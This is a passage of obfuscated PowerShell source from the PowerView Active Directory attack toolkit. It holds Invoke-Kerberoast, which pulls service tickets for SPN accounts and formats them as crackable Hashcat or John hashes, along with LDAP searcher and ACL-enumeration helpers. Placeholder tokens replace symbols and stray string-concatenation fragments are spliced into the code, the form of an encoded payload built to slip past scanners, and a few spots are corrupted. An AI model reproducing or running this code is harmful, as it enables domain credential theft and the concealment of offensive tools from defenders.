                        gIF1HashFormat = Zfr2dOgIF1krb5tgs2dOgIF1gIF1(gIF1Ticket.ServicePrincipalName):gIF1HashZfr
                    }
                    else {
                        if (gIF1DistinguishedName -ne 41aUNKNOWN41a) {
                            gIF1UserDomain = gIF1DistinguishedName.SubString(gIF1DistinguishedName.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                        }
                        else {
                            gIF1UserDomain = 41aUNKNOWN41a
                        }

                        # hashcat output format - gIF1krb5tgsgIF123gIF1*usergIF1realmgIF1test/spn*gIF163386d22d359fe...
                    '+'    gIF1HashFormat = Zfr2dOgIF1krb5tgs2dOgIF1gIF1(gIF1Etype)2dOgIF1*gIF1SamAccountName2dOgIF1gIF1UserDomain2dOgIF1gIF1(gIF1Ticket.ServicePrincipalName)*2dOgIF1gIF1HashZfr
                    }
                    gIF1Out U9B Add-Member Noteproperty 41aHash41a gIF1HashFormat
                }

                gIF1Out.PSObject.TypeNames.Insert(0, 41aPowerView.SPNTicket41a)
                gIF1Out
            }
        }
    }

    END {
        if (gIF1LogonToken) {
            Invoke-RevertToSelf -TokenHandle gIF1LogonToken
        }
    }
}


function Invoke-Kerberoast {
<#
.SYNOPSIS

Requests service tickets for kerberoast-able accounts and returns extracted ticket hashes.

Author: Will Schroeder (@harmj0y), @machosec  
License: BSD 3-Clause  
Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, Get-DomainUser, Get-DomainSPNTicket  

.DESCRIPTION

Uses Get-DomainUser to query for user accounts with non-null service principle
names (SPNs) and uses Get-SPNTicket to request/extract the crackable ticket information.
The ticket format can be specified with -OutputFormat <John/Hashcat>.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER OutputFormat

Either 41aJohn41a for John the Ripper style hash formatting, or 41aHashcat41a for Hashcat format.
Defaults to 41aHashcat41a.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Invoke-Kerberoast U9B fl

Kerberoasts all found SPNs for the current domain, outputting to Hashcat format (default).

.EXAMPLE

Invoke-Kerberoast -Domain dev.testlab.local U9B fl

Kerberoasts all found SPNs for the testlab.local domain, outputting to JTR
format instead of Hashcat.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -orce
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLBYwWdfm.a41a, gIF1SecPassword)
Invoke-Kerberoast -Credential gIF1Cred -Verbose -Domain testlab.local U9B fl

Kerberoasts all found SPNs for the testlab.local domain using alternate credentials.

.OUTPUTS

PowerView.SPNTicket

Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.SPNTicket41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a, 41aMemberDistinguishedName41a, 41aMemberName41a)]
        [String[]]
        gIF1Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [ValidateSet(41aJohn41a, 41aHashcat41a)]
        [Alias(41aFormat41a)]
        [String]
        gIF1OutputFormat = 41aHashcat41a,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1UserSearcherArguments = @{
            41aSPN41a = gIF1True
            41aProperties41a = 41asamaccountname,distinguishedname,serviceprincipalname41a
        }
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1UserSearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aLDAPFil'+'ter41a]) { gIF1UserSearcherArguments[41aLDAPFilter41a] = gIF1LDAPFilter }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1UserSearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1UserSearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1UserSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1UserSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1UserSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1UserSearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1UserSearcherArguments[41aCredential41a] = gIF1Credential }

        if (gIF1PSB'+'oundParameters[41aCredential41a]) {
            gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential
        }
    }

    PROCESS {
        if (gIF1PSBoundParameters[41aIdentity41a]) { gIF1UserSearcherArguments[41aIdentity41a] = gIF1Identity }
        Get-DomainUser @UserSearcherArguments U9B Where-Object {gIF1_.samaccountname -ne 41akrbtgt41a} U9B Get-DomainSPNTicket -OutputFormat gIF1OutputFormat
    }

    END {
        if (gIF1LogonToken) {
            Invoke-RevertToSelf -TokenHandle gIF1LogonToken
        }
    }
}


function Get-PathAcl {
<#
.SYNOPSIS

Enumerates the ACL for a given file path.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, ConvertFrom-SID  

.DESCRIPTION

Enumerates the ACL for a specified file/folder path, and translates
the access rules for each entry into readable formats. If -Credential is passed,
Add-RemoteConnection/Remove-RemoteConnection is used to temporarily map the remote share.

.PARAMETER Path

Specifies the local or remote path to enumerate the ACLs for.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target path.

.EXAMPLE

Get-PathAcl ZfrYwWYwWSERVERYwWShareYwWZfr

Returns ACLs for the given UNC share.

.EXAMPLE

gci .YwWtest.txt U9B Get-PathAcl

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm41a, gIF1SecPassword)
Get-PathAcl -Path ZfrYwWYwWSERVERYwWShareYwWZfr -Credential gIF1Cred

.INPUTS

String

One of more paths to enumerate ACLs for.

.OUTPUTS

PowerView.FileACL

A custom object with the full path and associated ACL entries.

.LINK

https://support.microsoft.com/en-us/kb/305144
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.FileACL41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = gIF1True, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aFullName41a)]
        [String[]]
        gIF1Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function Convert-FileRight {
            # From Ansgar Wiechers at http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
            [CmdletBinding()]
            Param(
                [Int]
                gIF1FSR
            )

            gIF1AccessMask = @{
                [uint32]41a0x8000000041a = 41aGenericRead41a
                [uint32]41a0x4000000041a = 41aGenericWrite41a
                [u'+'int32]41a0x2000000041a = 41aGenericExecute41a
                [uint32]41a0x1000000041a = 41aGenericAll41a
                [uint32]41a0x0200000041a = 41aMaximumAllowed41a
                [uint32]41a0x0100000041a = 41aAccessSystemSecurity41a
                [uint32]41a0x0010000041a = 41aSynchronize41a
                [uint32]41a0x0008000041a = 41aWriteOwner41a
                [uint32]41a0x0004000041a = 41aWriteDAC41a
                [uint32]41a0x0002000041a = 41aReadControl41a
                [uint32]41a0x0001000041a = 41aDelete41a
                [uint32]41a0x0000010041a = 41aWriteAttributes41a
                [uint32]41a0x0000008041a = 41aReadAttributes41a
                [uint32]41a0x0000004041a = 41aDeleteChild41a
                [uint32]41a0x0000002041a = 41aExecute/Traverse41a
                [uint32]41a0x0000001041a = 41aWriteExtendedAttributes41a
                [uint32]41a0x0000000841a = 41aReadExtendedAttributes41a
                [uint32]41a0x0000000441a = 41aAppendData/AddSubdirectory41a
                [uint32]41a0x0000000241a = 41aWriteData/AddFile41a
                [uint32]41a0x0000000141a = 41aReadData/ListDirectory41a
            }

            gIF1SimplePermissions = @{
                [uint32]41a0x1f01ff41a = 41aFullControl41a
                [uint32]41a0x0301bf41a = 41aModify41a
                [uint32]41a0x0200a941a = 41aReadAndExecute41a
                [uint32]41a0x02019f41a = 41a'+'ReadAndWrite41a
                [uint32]41a0x02008941a = 41aRead41a
                [uint32]41a0x00011641a = 41aWrite41a
            }

            gIF1Permissions = @()

            # get simple permission
            gIF1Permissions += gIF1SimplePermissions.Keys U9B ForEach-Object {
                              if ((gIF1FSR -band gIF1_) -eq gIF1_) {
                                gIF1SimplePermissions[gIF1_]
                                gIF1FSR = gIF1FSR -band (-not gIF1_)
                              }
                            }

            # get remaining extended permissions
            gIF1Permissions += gIF1AccessMask.Keys U9B Where-Object { gIF1FSR -band gIF1_ } U9B ForEach-Object { gIF1AccessMask[gIF1_] }
            (gIF1Permissions U9B Where-Object {gIF1_}) -join 41a,41a
        }

        gIF1ConvertArguments = @{}
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ConvertArguments[41aCredential41a] = gIF1Credential }

        gIF1MappedComputers = @{}
    }

    PROCESS {
        ForEach (gIF1TargetPath in gIF1Path) {
            try {
                if ((gIF1TargetPath -Match 41aYwWYwWYwWYwW.*YwWYwW.*41a) -and (gIF1PSBoundParameters[41aCredential41a])) {
                    gIF1HostComputer = (New-Object System.Uri(gIF1TargetPat'+'h)).Host
                    if (-not gIF1MappedComputers[gIF1HostComputer]) {
                        # map IPCgIF1 to this computer if it41as not already
                        Add-RemoteConnection -ComputerName gIF1HostComputer -Credential gIF1Credential
                        gIF1MappedComputers[gIF1HostComputer] = gIF1True
                    }
                }

                gIF1ACL = Get-Acl -Path gIF1TargetPath

                gIF1ACL.GetAccessRules(gIF1True, gIF1True, [System.Security.Principal.SecurityIdentifier]) U9B ForEach-Object {
                    gIF1SID = gIF1_.IdentityReference.Value
                    gIF1Name = ConvertFrom-SID -ObjectSID gIF1SID @ConvertArguments

                    gIF1Out = New-Object PSObject
                    gIF1Out U9B Add-Member Noteproperty 41aPath41a gIF1TargetPath
                    gIF1Out U9B Add-Member Noteproperty 41aFileSystemRights41a (Convert-FileRight -FSR gIF1_.FileSystemRights.value__)
                    gIF1Out U9B Add-Member Noteproperty 41aIdentityReference41a gIF1Name
                    gIF1Out U9B Add-Member Noteproperty 41aIdentitySID41a gIF1SID
                    gIF1Out U9B Add-Member Noteproperty 41aAccessControlType41a gIF1_.AccessControlType
                    gIF1Out.PSObject.TypeNames.Insert(0, 41aPowerView.FileACL41a)
                    gIF1Out
                }
            }
            catch {
                Write-Verbose Zfr[Get-PathAcl] error: gIF1_Zfr
            }
        }
    }

    END {
        # remove the IPCgIF1 mappings
        gIF1MappedComputers.Keys U9B Remove-RemoteConnection
    }
}


function Convert-LDAPProperty {
<#
.SYNOPSIS

Helper that converts specific LDAP property result fields and outputs
a custom psobject.

Author: Will Schroeder (@harmj0y)  
License: BSD '+'3-Clause  
Required Dependencies: None  

.DESCRIPTION

Converts a set of raw LDAP properties results from ADSI/LDAP searches
into a proper PSObject. Used by several of the Get-Domain* function.

.PARAMETER Properties

Properties object to extract out LDAP fields for display.

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject with LDAP hashtable properties translated.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [Outp'+'utType(41aSystem.Management.Automation.PSCustomObject41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = gIF1True, ValueFromPipeline = gIF1True)]
        [ValidateNotNullOrEmpty()]
        gIF1Properties
    )

    gIF1ObjectProperties = @{}

    gIF1Properties.PropertyNames U9B ForEach-Object {
        if (gIF1_ -ne 41aadspath41a) {
            if ((gIF1_ -eq 41aobjectsid41a) -or (gIF1_ -eq 41asidhistory41a)) {
                # convert all listed sids (i.e. if multiple are listed in sidHistory)
                gIF1ObjectProperties[gIF1_] = gIF1Properties[gIF1_] U9B ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier(gIF1_, 0)).Value }
            }
            elseif (gIF1_ -eq 41agrouptype41a) {
                gIF1ObjectProperties[gIF1_] = gIF1Properties[gIF1_][0] -as gIF1GroupTypeEnum
            }
            elseif (gIF1_ -eq 41asamaccounttype41a) {
                gIF1ObjectProperties[gIF1_] = gIF1Properties[gIF1_][0] -as gIF1SamAccountTypeEnum
            }
            elseif (gIF1_ -eq 41aobjectguid41a) {
                # convert the GUID to a string
                gIF1ObjectProperties[gIF1_] = (New-Object Guid (,gIF1Properties[gIF1_][0])).Guid
            }
            elseif (gIF1_ -eq 41auseraccountcontrol41a) {
                gIF1ObjectProperties[gIF1_] = gIF1Properties[gIF1_][0] -as gIF1UACEnum
            }
            elseif (gIF1_ -eq 41antsecuritydescriptor41a) {
                # gIF1ObjectProperties[gIF1_] = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList gIF1Properties[gIF1_][0], 0
                gIF1Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList gIF1Properties[gIF1_][0], 0
                if (gIF1Descriptor.Owner) {
                    gIF1ObjectProperties[41aOwner41a] = gIF1Descriptor.Owner
                }
                if (gIF1Descriptor.Group) {
                    gIF1ObjectProperties[41aGroup41a] = gIF1Descriptor.Group
                }
                if (gIF1Descriptor.DiscretionaryAcl) {
                    gIF1ObjectProperties[41aDiscretionaryAcl41a] = gIF1Descriptor.DiscretionaryAcl
                }
                if (gIF1Descriptor.SystemAcl) {
                    gIF1ObjectProperties[41aSystemAcl41a] = gIF1Descriptor.SystemAcl
                }
            }
            elseif (gIF1_ -eq 41aaccountexpires41a) {
                if (gIF1Properties[gIF1_][0] -gt [DateTime]::MaxValue.Ticks) {
                    gIF1ObjectProperties[gIF1_] = ZfrNEVERZfr
                }
                el'+'se {
                    gIF1ObjectProperties[gIF1_] = [datetime]::fromfiletime(gIF1Properties[gIF1_][0])
                }
            }
            elseif ( (gIF1_ -eq 41alastlogon41a) -or (gIF1_ -eq 41alastlogontimestamp41a) -or (gIF1_ -eq 41apwdlastset41a) -or (gIF1_ -eq 41alastlogoff41a) -or (gIF1_ -eq 41abadPasswordTime41a) ) {
                # convert timestamps
                if (gIF1Properties[gIF1_][0] -is [System.MarshalByRefObject]) {
                    # if we have a System.__ComObject
                    gIF1Temp = gIF1Properties[gIF1_][0]
                    [Int32]gIF1High = gIF1Temp.GetType().InvokeMember(41aHighPart41a, [System.Reflection.BindingFlags]::GetProperty, gIF1Null, gIF1Temp, gIF1Null)
                    [Int32]gIF1Low  = gIF1Temp.GetType().InvokeMember(41aLowPart41a,  [System.Reflection.BindingFlags]::GetProperty, gIF1Null, gIF1Temp, gIF1Null)
                    gIF1ObjectProperties[gIF1_] = ([datetime]::FromFileTime([Int64](Zfr0x{0:x8}{1:x8}Zfr -f gIF1High, gIF1Low)))
                }
                else {
                    # otherwise just a string
                    gIF1ObjectProperties[gIF1_] = ([datetime]::FromFileTime((gIF1Properties[gIF1_][0])))
                }
            }
            elseif (gIF1Properties[gIF1_][0] -is [System.MarshalByRefObject]) {
            '+'    # try to convert misc com objects
                gIF1Prop = gIF1Properties[gIF1_]
                try {
                    gIF1Temp = gIF1Prop[gIF1_][0]
                    [Int32]gIF1High = gIF1Temp.GetType().InvokeMember(41aHighPart41a, [System.Reflection.BindingFlags]::GetProperty, gIF1Null, gIF1Temp, gIF1Null)
                    [Int32]gIF1Low  = gIF1Temp.GetType().InvokeMember(41aLowPart41a,  [System.Reflection.BindingFlags]::GetProperty, gIF1Null, gIF1Temp, gIF1Null)
     '+'               gIF1ObjectProperties[gIF1_] = [Int64](Zfr0x{0:x8}{1:x8}Zfr -f gIF1High, gIF1Low)
                }
                catch {
                    Write-Verbose Zfr[Convert-LDAPProperty] error: gIF1_Zfr
  '+'                  gIF1ObjectProperties[gIF1_] = gIF1Prop[gIF1_]
                }
            }
   '+'         elseif (gIF1Properties[gIF1_].count -eq 1) {
                gIF1ObjectProperties[gIF1_] = gIF1Properties[gIF1_][0]
            }
            else {
                gIF1ObjectProperties[gIF1_] = gIF1Properties[gIF1_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property gIF1ObjectProperties
    }
    catch {
        Write-Warning Zfr[Convert-LDAPProperty] Error parsing LDAP properties : gIF1_Zfr
    }
}


########################################################
#
# Domain info functions below.
#
########################################################

function Get-DomainSearcher {
<#
.SYNOPSIS

Helper used by various functions that builds a custom AD searcher object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain  

.DESCRIPTION

Takes a given domain and a number of customizations and returns a
System.DirectoryServices.DirectorySearcher object. This function is used
heavily by other LDAP/ADSI searcher functions (Verb-Domain*).

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER SearchBasePrefix

Specifies a prefix for the LDAP search string (i.e. ZfrCN=Sites,CN=ConfigurationZfr).

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainSearcher '+'-Domain testlab.local

Return a searcher for all objects in testlab.local.

.EXAMPLE

Get-DomainSearcher -Domain testlab.local -LDAPFilter 41a(samAccountType=805306368)41a -Properties 41aSamAccountName,lastlogon41a

Return a searcher for user objects in testlab.local and only return the SamAccountName and LastLogon properties.

.EXAMPLE

Get-DomainSearcher -SearchBase ZfrLDAP://OU=secret,DC=testlab,DC=localZfr

Return a searcher that searches through the specific ADS/LDAP search base (i.e. OU).

.OUTPUTS

System.DirectoryServices.DirectorySearcher
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aSystem.DirectoryServices.DirectorySearcher41a)]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1SearchBasePrefix,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit = 120,

        '+'[ValidateSet(41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a)]
 '+'       [String]
        gIF1SecurityMasks,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if (gIF1PSBoundParameters[41aDomain41a]) {
            gIF1TargetDomain = gIF1Domain

            if (gIF1ENV:USERDNSDOMAIN -and (gIF1ENV:USERDNSDOMAIN.Trim() -ne 41a41a)) {
                # see if we can grab the user DNS logon domain from environment variables
                gIF1UserDomain = gIF1ENV:USERDNSDOMAIN
                if (gIF1ENV:LOGONSERVER -and (gIF1ENV:LOGONSERVER.Trim() -ne 41a41a) -and gIF1UserDomain) {
                    gIF1BindServer = ZfrgIF1(gIF1ENV:LOGONSERVER -replace 41aYwWYwW41a,41a41a).gIF1UserDomainZfr
                }
            }
        }
        elseif (gIF1PSBoundParameters[41aCredential41a]) {
            # if not -Domain is specified, but -Credential is, try to retrieve the current domain name with Get-Domain
            gIF1DomainObject = Get-Domain -Credential gIF1Credential
            gIF1BindServer = (gIF1DomainObject.PdcRoleOwner).Name
            gIF1TargetDomain = gIF1DomainObject.Name
        }
        elseif (gIF1ENV:USERDNSDOMAIN -and (gIF1ENV:USERDNSDOMAIN.Trim() -ne 41a41a)) {
            # see if we can grab the user DNS logon domain from environment variables
            gIF1TargetDomain = gIF1ENV:USERDNSDOMAIN
            if (gIF1ENV:LOGONSERVER -and (gIF1ENV:LOGONSERVER.Trim() -ne 41a41a) -and gIF1TargetDomain) {
                gIF1BindServer = ZfrgIF1(gIF1ENV:LOGONSERVER -replace 41aYwWYwW41a,41a41a).gIF1TargetDomainZfr
            }
        }
        else {
            # otherwise, resort to Get-Domain to retrieve the current domain object
            write-verbose Zfrget-domainZfr
            gIF1DomainObject = Get-Domain
            gIF1BindServer = (gIF1DomainObject.PdcRoleOwner).Name
            gIF1TargetDomain = gIF1DomainObject.Name
        }

        if (gIF1PSBoundParameters[41aServer41a]) {
            # if there41as not a specified server to bind to, try to pull a logon server from ENV variables
            gIF1BindServer = gIF1Server
        }

        gIF1SearchString = 41aLDAP://41a

        if (gIF1BindServer -and (gIF1BindServer.Trim() -ne 41a41a)) {
            gIF1SearchString += gIF1BindServer
            if (gIF1TargetDomain) {
                gIF1SearchString += 41a/41a
            }
        }

        if (gIF1PSBoundParameters[41aSearchBasePrefix41a]) {
            gIF1SearchString += gIF1SearchBasePrefix + 41a,41a
        }

        if (gIF1PSBoundParameters[41aSearchBase41a]) {
            if (gIF1SearchBase -Match 41a^GC://41a) {
                # if we41are searching the global catalog, get the path in the right format
                gIF1DN = gIF1SearchBase.ToUpper().Trim(41a/41a)
                gIF1SearchString = 41a41a
            }
            else {
                if (gIF1SearchBase -match 41a^LDAP://41a) {
                    if (gIF1SearchBase -match ZfrLDAP://.+/.+Zfr) {
                        gIF1SearchString = 41a41a
                        gIF1DN = gIF1SearchBase
                    }
                    else {
                        gIF1DN = gIF1SearchBase.SubString(7)
                    }
                }
                else {
                    gIF1DN = gIF1SearchBase
                }
            }
        }
        else {
            # transform the target domain name into a distinguishedName if an ADS search base is not specified
            if (gIF1TargetDomain -and (gIF1TargetDomain.Trim() -ne 41a41a)) {
                gIF1DN = ZfrDC=gIF1(gIF1TargetDomain.Replace(41a.41a, 41a,DC=41a))Zfr
            }
        }

        gIF1SearchString += gIF1DN
        Write-Verbose Zfr[Get-DomainSearcher] search base: gIF1SearchStringZfr

        if (gIF1Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose Zfr[Get-DomainSearcher] Using alternate credentials for LDAP connectionZfr
            # bind to the inital search object using alternate credentials
            gIF1DomainObject = New-Object DirectoryServices.DirectoryEntry(gIF1SearchString, gIF1Credential.UserName, gIF1Credential.GetNetworkCredential().Password)
            gIF1Searcher = New-Object System.DirectoryServices.DirectorySearcher(gIF1DomainObject)
        }
        else {
            # bind to the inital object using the current credentials
            gIF1Searcher = New-Object System.DirectoryServices.DirectoryS'+'earcher([ADSI]gIF1SearchString)
        }

        gIF1Searcher.PageSize = gIF1ResultPageSize
        gIF1Searcher.SearchScope = gIF1SearchScope
        gIF1Searcher.CacheResults = gIF1False
        gIF1Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) {
            gIF1Searcher.ServerTimeLimit = gIF1ServerTimeLimit
        }

        if (gIF1PSBoundParameters[41aTombstone41a]) {
            gIF1Searcher.Tombstone = gIF1True
        }

        if (gIF1PSBoundParameters[41aLDAPFilter41a]) {
            gIF1Searcher.filter = gIF1LDAPFilter
        }

        if (gIF1PSBoundParameters[41aSecurityMasks41a]) {
            gIF1Searcher.SecurityMasks = Switch (gIF1SecurityMasks) {
                41aDacl41a { [System.DirectoryServices.SecurityMasks]::Dacl }
                41aGroup41a { [System.DirectoryServices.SecurityMasks]::Group }
                41aNone41a { [System.DirectoryServices.SecurityMasks]::None }
                41aOwner41a { [System.DirectoryServices.SecurityMasks]::Owner }
                41aSacl41a { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if (gIF1PSBoundParameters[41aProperties41a]) {
            # handle an array of properties to load w/ the possibility of comma-separated strings
            gIF1PropertiesToLoad = gIF1PropertiesU9B ForEach-Object { gIF1_.Split(41a,41a) }
            gIF1Null = gIF1Searcher.PropertiesToLoad.AddRange((gIF1PropertiesToLoad))
        }

        gIF1Searcher
    }
}


function Convert-DNSRecord {
<#
.SYNOPSIS

Helpers that decodes a binary DNS record blob.

Author: Michael B. Smith, Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Decodes a binary blob representing an Active Directory DNS entry.
Used by Get-DomainDNSRecord.

Adapted/ported from Michael B. Smith41as code at https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1

.PARAMETER DNSRecord

A byte array representing the DNS record.

.OUTPUTS

System.Management.Automation.PSCustomObject

Outputs custom PSObjects with detailed information about the DNS record entry.

.LINK

https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
#>

    [OutputType(41aSystem.Management.Automation.PSCustomObject41a)]
    [CmdletBinding()]
    Param(
       '+' [Parameter(Position = 0, Mandatory = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Byte[]]
        gIF1DNSRecord
    )

    BEGIN {
        function Get-Name {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseOutputTypeCorrectly41a, 41a41a)]
            [CmdletBinding()]
            Param(
                [Byte[]]
                gIF1Raw
            )

            [Int]gIF1Length = gIF1Raw[0]
            [Int]gIF1Segments = gIF1Raw[1]
            [Int]gIF1Index =  2
            [String]gIF1Name  = 41a41a

            while (gIF1Segments-- -gt 0)
            {
                [Int]gIF1SegmentLength = gIF1Raw[gIF1Index++]
                while (gIF1SegmentLength-- -gt 0) {
                    gIF1Name += [Char]gIF1Raw[gIF1Index++]
                }
                gIF1Name += Zfr.Zfr
            }
            gIF1Name
        }
    }

    PROCESS {
        # gIF1RDataLen = [BitConverter]::ToUInt16(gIF1DNSRecord, 0)
        gIF1RDataType = [BitConverter]::ToUInt16(gIF1DNSRecord, 2)
        gIF1UpdatedAtSerial = [BitConverter]::ToUInt32(gIF1DNSRecord, 8)

        gIF1TTLRaw = gIF1DNSRecord[12..15]

        # reverse for big endian
        gIF1Null = [array]::Reverse(gIF1TTLRaw)
        gIF1TTL = [BitConverter]::ToUInt32(gIF1TTLRaw, 0)

        gIF1Age = [BitConverter]::ToUInt32(gIF1DNSRecord, 20)
        if (gIF1Age -ne 0) {
            gIF1TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours(gIF1age)).ToString()
        }
        else {
            gIF1TimeStamp = 41a[static]41a
        }

        gIF1DNSRecordObject = New-Object PSObject

        if (gIF1RDataType -eq 1) {
